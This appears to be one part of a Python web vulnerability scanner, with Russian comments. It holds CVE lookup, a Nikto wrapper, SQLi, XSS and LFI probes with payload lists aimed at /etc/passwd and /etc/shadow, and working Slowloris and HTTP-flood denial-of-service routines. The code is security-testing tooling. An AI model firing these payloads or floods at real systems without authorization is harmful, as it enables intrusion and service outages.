# ==============================================================================
# PART 4 — МОДУЛИ УЯЗВИМОСТЕЙ
# CVE, Nikto, SQLi, XSS, LFI, Стресс-тесты
# ==============================================================================
# Требует: part1_core.py, part2_repos.py, part3_analysis.py
# ==============================================================================

import os
import re
import sys
import json
import time
import socket
import ssl
import random
import string
import threading
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urlencode, urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False


# ==============================================================================
# БАЗА ДЛЯ ВСЕХ СКАНЕРОВ УЯЗВИМОСТЕЙ
# ==============================================================================
class VulnBase:
    """
    Базовый класс для сканеров уязвимостей
    Хранит результаты в едином формате
    """

    NAME = "vuln"
    DESCRIPTION = "Сканер уязвимостей"
    SEVERITIES = ("critical", "high", "medium", "low", "info")

    def __init__(self, logger: "Logger"):
        self.logger = logger
        self.results: Dict[str, Any] = {
            "vulnerabilities": [],
            "info": [],
            "errors": [],
            "duration": 0.0,
        }
        self._start_time: Optional[float] = None
        self._lock = threading.Lock()

    # ---------- Управление ----------
    def _start(self):
        self._start_time = time.time()

    def _stop(self):
        if self._start_time:
            self.results["duration"] = time.time() - self._start_time

    def reset(self):
        self.results = {
            "vulnerabilities": [],
            "info": [],
            "errors": [],
            "duration": 0.0,
        }

    # ---------- Добавление ----------
    def add_vuln(self, name: str, severity: str, description: str,
                 evidence: str = "", url: str = "", param: str = "",
                 cve: str = "", cvss: Optional[float] = None):
        """Добавляет найденную уязвимость"""
        severity = severity.lower()
        if severity not in self.SEVERITIES:
            severity = "info"

        with self._lock:
            self.results["vulnerabilities"].append({
                "name": name,
                "severity": severity,
                "description": description,
                "evidence": evidence,
                "url": url,
                "param": param,
                "cve": cve,
                "cvss": cvss,
                "scanner": self.NAME,
                "timestamp": datetime.now().isoformat(),
            })

    def add_info(self, message: str, **extra):
        """Добавляет информационное сообщение"""
        item = {
            "message": message,
            "scanner": self.NAME,
            "timestamp": datetime.now().isoformat(),
        }
        item.update(extra)
        with self._lock:
            self.results["info"].append(item)

    def add_error(self, message: str):
        """Добавляет ошибку"""
        with self._lock:
            self.results["errors"].append({
                "message": message,
                "scanner": self.NAME,
                "timestamp": datetime.now().isoformat(),
            })
        self.logger.debug(f"[{self.NAME}] {message}")

    # ---------- Итог ----------
    def finalize(self) -> Dict[str, Any]:
        """Возвращает результаты"""
        self._stop()
        return self.results

    def count(self) -> int:
        return len(self.results.get("vulnerabilities", []))

    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        """Переопределяется"""
        raise NotImplementedError


# ==============================================================================
# CVE SCANNER
# ==============================================================================
class CVEScanner(VulnBase):
    """
    Поиск CVE-уязвимостей
    - NVD API (онлайн)
    - Offline fallback по версиям
    """

    NAME = "cve"
    DESCRIPTION = "Поиск CVE"

    NVD_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"

    # Известные уязвимые версии (offline база)
    KNOWN_VULNS = {
        "nginx": {
            "1.18.0": [("CVE-2021-23017", "high", "DNS resolver off-by-one")],
            "1.16.0": [("CVE-2019-20372", "medium", "HTTP request smuggling")],
        },
        "apache": {
            "2.4.49": [("CVE-2021-41773", "critical", "Path traversal & RCE")],
            "2.4.50": [("CVE-2021-42013", "critical", "Path traversal bypass")],
            "2.4.51": [("CVE-2021-42013", "critical", "Path traversal bypass")],
        },
        "openssh": {
            "7.4": [("CVE-2018-15473", "medium", "Username enumeration")],
            "8.5": [("CVE-2021-41617", "medium", "Privilege escalation")],
        },
        "php": {
            "7.4.0": [("CVE-2019-11043", "critical", "FPM RCE via env")],
            "8.1.0": [("CVE-2024-4577", "critical", "CGI argument injection")],
        },
        "wordpress": {
            "5.0": [("CVE-2019-8942", "high", "RCE via crafted image")],
            "5.7": [("CVE-2021-29447", "high", "XXE in media library")],
        },
        "openssl": {
            "1.1.1": [("CVE-2022-0778", "high", "BN_mod_sqrt infinite loop")],
            "3.0.0": [("CVE-2022-0778", "high", "BN_mod_sqrt infinite loop")],
        },
        "iis": {
            "10.0": [("CVE-2021-31166", "critical", "HTTP.sys RCE")],
        },
    }

    def __init__(self, logger: "Logger", use_online: bool = True, timeout: int = 10):
        super().__init__(logger)
        self.use_online = use_online and HAS_REQUESTS
        self.timeout = timeout

    def scan(self, target: "Target",
             http_result: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Сканирует цель на CVE

        http_result — уже полученный результат HTTPAnalyzer (чтобы не делать повторно)
        """
        self._start()
        self.reset()

        # Определяем технологии
        technologies = self._extract_technologies(http_result)
        if not technologies:
            self.add_info("Не удалось определить технологии")
            return self.finalize()

        self.logger.info(f"  Найдено технологий: {len(technologies)}")

        for product, version in technologies.items():
            # Offline
            offline = self._check_offline(product, version)
            for cve_id, severity, desc in offline:
                self.add_vuln(
                    name=cve_id,
                    severity=severity,
                    description=desc,
                    evidence=f"{product} {version}",
                    cve=cve_id,
                )

            # Online (если есть)
            if self.use_online:
                online = self._check_online(product, version)
                for cve in online:
                    # Не дублируем
                    if not any(v["cve"] == cve["cve"] for v in self.results["vulnerabilities"]):
                        self.add_vuln(
                            name=cve["cve"],
                            severity=cve.get("severity", "info"),
                            description=cve.get("description", ""),
                            evidence=f"{product} {version}",
                            cve=cve["cve"],
                            cvss=cve.get("cvss"),
                        )

        return self.finalize()

    # ---------- Извлечение технологий ----------
    def _extract_technologies(self,
                               http_result: Optional[Dict[str, Any]]) -> Dict[str, str]:
        """Извлекает product → version из HTTP-результата"""
        versions: Dict[str, str] = {}

        if not http_result:
            return versions

        # Из Server
        server = http_result.get("server") or ""
        if server:
            parsed = self._parse_version_string(server)
            if parsed:
                versions.update(parsed)

        # Из технологий
        for tech in http_result.get("technologies", []):
            parsed = self._parse_version_string(tech)
            if parsed:
                versions.update(parsed)

        # Из headers
        headers = http_result.get("headers", {}) or {}
        for h in ("Server", "X-Powered-By", "X-Generator", "X-AspNet-Version"):
            if h in headers:
                parsed = self._parse_version_string(str(headers[h]))
                if parsed:
                    versions.update(parsed)

        return versions

    def _parse_version_string(self, s: str) -> Dict[str, str]:
        """Парсит 'nginx/1.18.0' → {'nginx': '1.18.0'}"""
        result = {}
        if not s:
            return result

        # Ищем pattern product/version
        for m in re.finditer(r'([A-Za-z][A-Za-z0-9_\-]+)[/\s]+(\d+\.\d+(?:\.\d+)?)', s):
            product = m.group(1).lower()
            version = m.group(2)
            result[product] = version

        return result

    # ---------- Offline ----------
    def _check_offline(self, product: str, version: str) -> List[Tuple[str, str, str]]:
        """Проверка по встроенной базе"""
        result = []
        product_lower = product.lower()

        for known_product, versions in self.KNOWN_VULNS.items():
            if known_product in product_lower or product_lower in known_product:
                for known_version, vulns in versions.items():
                    if version.startswith(known_version) or known_version.startswith(version):
                        result.extend(vulns)

        return result

    # ---------- Online (NVD API) ----------
    def _check_online(self, product: str, version: str) -> List[Dict[str, Any]]:
        """Проверка через NVD API"""
        if not self.use_online:
            return []

        results = []
        try:
            params = {
                "keywordSearch": f"{product} {version}",
                "resultsPerPage": 5,
            }
            r = requests.get(
                self.NVD_API,
                params=params,
                timeout=self.timeout,
                headers={"User-Agent": Utils.get_random_ua()}
            )

            if r.status_code != 200:
                self.add_error(f"NVD API: HTTP {r.status_code}")
                return []

            data = r.json()
            for item in data.get("vulnerabilities", [])[:5]:
                cve = item.get("cve", {})
                cve_id = cve.get("id", "")
                if not cve_id:
                    continue

                # Описание
                description = ""
                for d in cve.get("descriptions", []):
                    if d.get("lang") == "en":
                        description = d.get("value", "")
                        break

                # Severity
                severity = "info"
                cvss = None
                metrics = cve.get("metrics", {})

                for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                    if key in metrics and metrics[key]:
                        m = metrics[key][0]
                        cvss_data = m.get("cvssData", {})
                        if key == "cvssMetricV2":
                            severity = cvss_data.get("baseSeverity", "info").lower()
                            cvss = cvss_data.get("baseScore")
                        else:
                            severity = cvss_data.get("baseSeverity", "info").lower()
                            cvss = cvss_data.get("baseScore")
                        break

                results.append({
                    "cve": cve_id,
                    "severity": severity,
                    "description": Utils.truncate(description, 300),
                    "cvss": cvss,
                })
        except Exception as e:
            self.add_error(f"NVD: {e}")

        return results

    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        return self.scan(target, http_result=kwargs.get("http_result"))


# ==============================================================================
# NIKTO SCANNER
# ==============================================================================
class NiktoScanner(VulnBase):
    """
    Интеграция с Nikto (web server scanner)
    Использует RepoManager для запуска nikto.pl
    """

    NAME = "nikto"
    DESCRIPTION = "Nikto web server scanner"

    def __init__(self, logger: "Logger", repo_manager: "RepoManager",
                 timeout: int = 180):
        super().__init__(logger)
        self.repo_manager = repo_manager
        self.timeout = timeout

    def scan(self, target: "Target") -> Dict[str, Any]:
        """Запускает Nikto против цели"""
        self._start()
        self.reset()

        # Ищем Nikto
        nikto_path = self._find_nikto()
        if not nikto_path:
            self.add_info("Nikto не найден (запустите --init-repos)")
            return self.finalize()

        # Определяем URL
        url = target.base_url("https") if target.port in (443, None) else target.base_url("http")

        # Формируем команду
        output_file = Path(tempfile.gettempdir()) / f"nikto_{int(time.time())}.json"

        perl = Utils.which("perl") or "perl"
        cmd = (
            f'"{perl}" "{nikto_path}" '
            f'-h "{url}" '
            f'-Format json '
            f'-output "{output_file}" '
            f'-nointeractive '
            f'-maxtime 120s'
        )

        self.logger.info(f"  Запуск Nikto против {url}...")

        ok, out, err = self.repo_manager._run_command(
            cmd, cwd=nikto_path.parent, timeout=self.timeout
        )

        if output_file.exists():
            self._parse_nikto_json(output_file)
            try:
                output_file.unlink()
            except Exception:
                pass
        else:
            # Fallback: парсим stdout
            if out:
                self._parse_nikto_stdout(out)
            elif err:
                self.add_error(f"Nikto: {Utils.truncate(err, 200)}")

        return self.finalize()

    def _find_nikto(self) -> Optional[Path]:
        """Ищет nikto.pl в repos или системе"""
        # В repos
        repo_path = self.repo_manager.get_repo_path("nikto")
        if repo_path:
            for name in ("nikto.pl", "program/nikto.pl", "nikto"):
                p = repo_path / name
                if p.exists():
                    return p

        # Системный
        for path in ("/usr/bin/nikto", "/usr/local/bin/nikto", "/opt/nikto/nikto.pl"):
            if Path(path).exists():
                return Path(path)

        which = Utils.which("nikto")
        if which:
            return Path(which)

        return None

    def _parse_nikto_json(self, path: Path):
        """Парсит JSON-вывод Nikto"""
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                data = json.load(f)
        except Exception as e:
            self.add_error(f"JSON parse: {e}")
            return

        # Nikto JSON может быть dict или list
        items = data if isinstance(data, list) else [data]

        for item in items:
            # Формат: {"vulnerabilities": [{"id":..., "msg":..., "url":...}]}
            vulns = item.get("vulnerabilities", []) if isinstance(item, dict) else []
            for v in vulns:
                self.add_vuln(
                    name=v.get("id") or v.get("msg", "Nikto finding"),
                    severity="medium",
                    description=v.get("msg", ""),
                    evidence=v.get("url", ""),
                    url=v.get("url", ""),
                )

            # Host info
            host = item.get("host", {}) if isinstance(item, dict) else {}
            if host.get("server"):
                self.add_info(f"Server: {host['server']}")

    def _parse_nikto_stdout(self, out: str):
        """Парсит текстовый вывод Nikto"""
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("+ ") and not line.startswith("+ Target") and not line.startswith("+ Start"):
                self.add_vuln(
                    name="Nikto finding",
                    severity="medium",
                    description=line[2:200],
                )

    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        return self.scan(target)


# ==============================================================================
# SQLI SCANNER
# ==============================================================================
class SQLiScanner(VulnBase):
    """
    Тест на SQL-инъекции
    - Error-based
    - Boolean-based
    - Time-based (опционально)
    """

    NAME = "sqli"
    DESCRIPTION = "SQL-инъекции"

    # Payload'ы для error-based
    ERROR_PAYLOADS = [
        "'",
        "\"",
        "')",
        "\")",
        "' OR '1'='1",
        "1' OR '1'='1",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' OR 1=1--",
        "1' OR 1=1#",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
    ]

    # Ошибки СУБД
    SQL_ERRORS = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "microsoft ole db provider for odbc drivers",
        "microsoft ole db provider for sql server",
        "odbc sql server driver",
        "sqlserver jdbc driver",
        "mysql_fetch_array",
        "mysql_fetch_assoc",
        "mysql_num_rows",
        "pg_query",
        "pg_exec",
        "postgresql query failed",
        "sqlite3.operationalerror",
        "sqlite error",
        "ora-01756",
        "ora-00933",
        "oracle error",
        "syntax error",
        "sqlstate",
        "division by zero",
        "invalid query",
        "jdbc",
        "sqlexception",
    ]

    # Тестовые параметры
    TEST_PARAMS = ["id", "page", "cat", "category", "product", "item", "user", "q", "query", "search"]

    def __init__(self, logger: "Logger", timeout: int = 10, threads: int = 10):
        super().__init__(logger)
        self.timeout = timeout
        self.threads = threads

    def scan(self, target: "Target",
             http_result: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Тестирует цель на SQLi"""
        self._start()
        self.reset()

        if not HAS_REQUESTS:
            self.add_error("requests не установлен")
            return self.finalize()

        base_url = target.base_url()

        # 1. Тест URL-параметров из главной
        urls_to_test = [base_url + "/", base_url + "/?id=1", base_url + "/?page=1"]

        # 2. Формы со страницы
        if HAS_BS4:
            forms = self._find_forms(base_url)
            for form in forms[:5]:
                self._test_form(form)

        # 3. Простые URL-параметры
        for url in urls_to_test:
            for param in self.TEST_PARAMS:
                if is_shutdown_requested():
                    break
                self._test_param(url, param)

        return self.finalize()

    def _find_forms(self, base_url: str) -> List[Dict[str, Any]]:
        """Находит формы на странице"""
        forms = []
        try:
            r = requests.get(base_url, timeout=self.timeout,
                             headers={"User-Agent": Utils.get_random_ua()})
            soup = BeautifulSoup(r.text, "html.parser")

            for form in soup.find_all("form"):
                action = form.get("action") or base_url
                if not action.startswith("http"):
                    action = urljoin(base_url, action)

                method = (form.get("method") or "GET").upper()
                inputs = {}
                for inp in form.find_all(["input", "textarea"]):
                    name = inp.get("name")
                    if name:
                        inputs[name] = inp.get("value") or "test"

                if inputs:
                    forms.append({
                        "action": action,
                        "method": method,
                        "inputs": inputs,
                    })
        except Exception as e:
            self.add_error(f"forms: {e}")

        return forms

    def _test_form(self, form: Dict[str, Any]):
        """Тестирует форму на SQLi"""
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        for param_name in inputs.keys():
            for payload in self.ERROR_PAYLOADS[:6]:
                data = dict(inputs)
                data[param_name] = payload

                try:
                    if method == "POST":
                        r = requests.post(action, data=data, timeout=self.timeout,
                                          headers={"User-Agent": Utils.get_random_ua()})
                    else:
                        r = requests.get(action, params=data, timeout=self.timeout,
                                         headers={"User-Agent": Utils.get_random_ua()})

                    if self._looks_like_sqli(r.text):
                        self.add_vuln(
                            name="SQL Injection (form)",
                            severity="high",
                            description=f"Параметр '{param_name}' в форме уязвим к SQLi",
                            evidence=f"payload={payload}",
                            url=action,
                            param=param_name,
                        )
                        return
                except Exception:
                    pass

    def _test_param(self, url: str, param: str):
        """Тестирует URL-параметр"""
        for payload in self.ERROR_PAYLOADS[:8]:
            try:
                r = requests.get(
                    url,
                    params={param: payload},
                    timeout=self.timeout,
                    headers={"User-Agent": Utils.get_random_ua()},
                )
                if self._looks_like_sqli(r.text):
                    self.add_vuln(
                        name="SQL Injection (GET)",
                        severity="high",
                        description=f"Параметр '{param}' уязвим к SQLi",
                        evidence=f"payload={payload}",
                        url=r.url,
                        param=param,
                    )
                    return
            except Exception:
                pass

    def _looks_like_sqli(self, text: str) -> bool:
        """Ищет признаки SQL-ошибки"""
        if not text:
            return False
        t = text.lower()
        return any(err in t for err in self.SQL_ERRORS)

    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        return self.scan(target, http_result=kwargs.get("http_result"))


# ==============================================================================
# XSS SCANNER
# ==============================================================================
class XSSScanner(VulnBase):
    """
    Тест на XSS (reflected)
    """

    NAME = "xss"
    DESCRIPTION = "XSS-уязвимости"

    PAYLOADS = [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
    ]

    UNIQUE_MARKER = "CASCXSS"

    TEST_PARAMS = ["q", "s", "search", "query", "name", "id", "page", "keyword", "keyword", "callback", "redirect"]

    def __init__(self, logger: "Logger", timeout: int = 10):
        super().__init__(logger)
        self.timeout = timeout

    def scan(self, target: "Target") -> Dict[str, Any]:
        self._start()
        self.reset()

        if not HAS_REQUESTS:
            self.add_error("requests не установлен")
            return self.finalize()

        base_url = target.base_url()

        for payload in self.PAYLOADS:
            if is_shutdown_requested():
                break

            # Уникальный маркер для точной проверки
            marker = f"{self.UNIQUE_MARKER}{random.randint(1000, 9999)}"
            test_payload = payload.replace("alert(1)", f"alert('{marker}')")

            for param in self.TEST_PARAMS:
                try:
                    r = requests.get(
                        base_url + "/",
                        params={param: test_payload},
                        timeout=self.timeout,
                        headers={"User-Agent": Utils.get_random_ua()},
                    )

                    if self._is_reflected(r.text, test_payload, marker):
                        self.add_vuln(
                            name="XSS (Reflected)",
                            severity="high",
                            description=f"Параметр '{param}' отражает ввод без экранирования",
                            evidence=f"payload={payload}",
                            url=r.url,
                            param=param,
                        )
                        break
                except Exception:
                    pass

        return self.finalize()

    def _is_reflected(self, response: str, payload: str, marker: str) -> bool:
        """Проверяет, отразился ли payload"""
        if not response:
            return False

        # Прямое отражение
        if payload in response:
            return True

        # Уникальный маркер + теги
        if marker in response and "<script>" in response.lower():
            return True

        return False

    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        return self.scan(target)


# ==============================================================================
# LFI SCANNER
# ==============================================================================
class LfiScanner(VulnBase):
    """
    Тест на Local File Inclusion
    """

    NAME = "lfi"
    DESCRIPTION = "LFI-уязвимости"

    PAYLOADS = [
        "../../../../etc/passwd",
        "../../../../etc/passwd%00",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd",
        "../../../../etc/hosts",
        "../../../../etc/shadow",
        "../../../../windows/win.ini",
        "..\\..\\..\\..\\windows\\win.ini",
        "../../../../windows/system32/drivers/etc/hosts",
        "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd",
    ]

    # Признаки успешного LFI
    LFI_SIGNATURES = [
        "root:x:0:0:",
        "root:*:0:0:",
        "daemon:x:",
        "bin:x:",
        "nobody:x:",
        "[fonts]",
        "[extensions]",
        "for 16-bit app support",
        "localhost.localdomain",
        "# localhost is used",
    ]

    TEST_PARAMS = ["file", "page", "path", "view", "include", "template", "load", "document", "folder", "root", "pg"]

    def __init__(self, logger: "Logger", timeout: int = 10):
        super().__init__(logger)
        self.timeout = timeout

    def scan(self, target: "Target") -> Dict[str, Any]:
        self._start()
        self.reset()

        if not HAS_REQUESTS:
            self.add_error("requests не установлен")
            return self.finalize()

        base_url = target.base_url()

        for param in self.TEST_PARAMS:
            for payload in self.PAYLOADS:
                if is_shutdown_requested():
                    break

                try:
                    r = requests.get(
                        base_url + "/",
                        params={param: payload},
                        timeout=self.timeout,
                        headers={"User-Agent": Utils.get_random_ua()},
                    )

                    if self._looks_like_lfi(r.text):
                        self.add_vuln(
                            name="LFI (Local File Inclusion)",
                            severity="high",
                            description=f"Параметр '{param}' уязвим к LFI",
                            evidence=f"payload={payload}",
                            url=r.url,
                            param=param,
                        )
                        return self.finalize()
                except Exception:
                    pass

        return self.finalize()

    def _looks_like_lfi(self, text: str) -> bool:
        """Ищет признаки LFI в ответе"""
        if not text:
            return False
        t = text.lower()
        return any(sig.lower() in t for sig in self.LFI_SIGNATURES)

    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        return self.scan(target)


# ==============================================================================
# STRESS TESTER
# ==============================================================================
class StressTester(VulnBase):
    """
    Малые стресс-тесты для проверки устойчивости
    - Slowloris
    - HTTP-флуд
    - GoldenEye (через RepoManager)
    """

    NAME = "stress"
    DESCRIPTION = "Стресс-тесты"

    def __init__(self, logger: "Logger", repo_manager: Optional["RepoManager"] = None):
        super().__init__(logger)
        self.repo_manager = repo_manager
        self.results["slowloris"] = {}
        self.results["http_flood"] = {}
        self.results["goldeneye"] = {}

    # ---------- Slowloris ----------
    def slowloris_test(self, target: "Target",
                       connections: int = 50,
                       duration: int = 5) -> Dict[str, Any]:
        """Тест Slowloris (открываем много соединений и держим)"""
        self.logger.info(f"  Slowloris: {connections} соединений на {duration}s...")

        result = {
            "success": False,
            "connections": 0,
            "errors": 0,
            "duration": duration,
        }

        stop_event = threading.Event()
        host = target.hostname
        port = target.port or (443 if target.scheme == "https" else 80)
        is_https = port == 443

        lock = threading.Lock()

        def worker():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))

                if is_https:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)

                # Отправляем заголовки по частям
                headers = [
                    f"GET / HTTP/1.1\r\n",
                    f"Host: {host}\r\n",
                    "User-Agent: Mozilla/5.0\r\n",
                    "Accept: */*\r\n",
                    "Connection: keep-alive\r\n",
                    "Keep-Alive: timeout=999, max=1000\r\n",
                ]

                for h in headers:
                    if stop_event.is_set():
                        break
                    try:
                        s.send(h.encode())
                        time.sleep(0.5)
                    except Exception:
                        break

                # Держим соединение
                while not stop_event.is_set():
                    try:
                        s.send(b"X-Keep-Alive: 1\r\n")
                        time.sleep(2)
                    except Exception:
                        break

                s.close()

                with lock:
                    result["connections"] += 1
            except Exception:
                with lock:
                    result["errors"] += 1

        threads = []
        for _ in range(connections):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.05)

        time.sleep(duration)
        stop_event.set()

        for t in threads:
            t.join(timeout=2)

        result["success"] = result["connections"] > 0
        self.results["slowloris"] = result
        return result

    # ---------- HTTP-флуд ----------
    def http_flood_test(self, target: "Target",
                        requests_count: int = 100,
                        workers: int = 10) -> Dict[str, Any]:
        """HTTP-флуд (много запросов за короткое время)"""
        self.logger.info(f"  HTTP-флуд: {requests_count} запросов / {workers} воркеров...")

        result = {
            "success": False,
            "requests": 0,
            "errors": 0,
            "duration": 0.0,
        }

        if not HAS_REQUESTS:
            result["errors"] = 1
            return result

        url = target.base_url()
        lock = threading.Lock()
        start = time.time()

        def worker(n: int):
            session = requests.Session()
            session.headers.update({"User-Agent": Utils.get_random_ua()})
            for _ in range(n):
                if is_shutdown_requested():
                    return
                try:
                    session.get(url, timeout=3)
                    with lock:
                        result["requests"] += 1
                except Exception:
                    with lock:
                        result["errors"] += 1

        per_worker = max(1, requests_count // workers)
        threads = [
            threading.Thread(target=worker, args=(per_worker,), daemon=True)
            for _ in range(workers)
        ]

        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=60)

        result["duration"] = time.time() - start
        result["success"] = result["requests"] > 0
        self.results["http_flood"] = result
        return result

    # ---------- GoldenEye ----------
    def goldeneye_test(self, target: "Target", duration: int = 10) -> Dict[str, Any]:
        """Запуск GoldenEye из RepoManager (если есть)"""
        result = {"success": False, "output": "", "errors": []}

        if not self.repo_manager:
            result["errors"].append("RepoManager не передан")
            return result

        repo_path = self.repo_manager.get_repo_path("goldeneye")
        if not repo_path:
            result["errors"].append("GoldenEye не найден (--init-repos)")
            return result

        script = repo_path / "goldeneye.py"
        if not script.exists():
            result["errors"].append("goldeneye.py не найден")
            return result

        url = target.base_url("https")

        try:
            cmd = (
                f'"{sys.executable}" "{script}" '
                f'"{url}" -w 5 -s 10 -d 10'
            )
            ok, out, err = self.repo_manager._run_command(
                cmd, cwd=repo_path, timeout=duration + 30
            )
            result["success"] = ok
            result["output"] = Utils.truncate(out, 500)
            if err:
                result["errors"].append(Utils.truncate(err, 200))
        except Exception as e:
            result["errors"].append(str(e))

        self.results["goldeneye"] = result
        return result

    # ---------- Полный тест ----------
    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        """Запускает все стресс-тесты (малые)"""
        self._start()
        self.reset()

        self.slowloris_test(target, connections=20, duration=3)
        self.http_flood_test(target, requests_count=50, workers=5)

        if self.repo_manager and self.repo_manager.has_repo("goldeneye"):
            try:
                self.goldeneye_test(target, duration=5)
            except Exception as e:
                self.add_error(f"GoldenEye: {e}")

        return self.finalize()


# ==============================================================================
# КОНЕЦ PART 4
# ==============================================================================
# В следующей части (part5_integration.py):
#   - class CascAnalys  (главный класс, интеграция всех модулей)
#   - analyze_target()  (полный анализ)
#   - smart_analyze()   (авто-подбор модулей)
#   - run()             (обработка args из CLI)
# ==============================================================================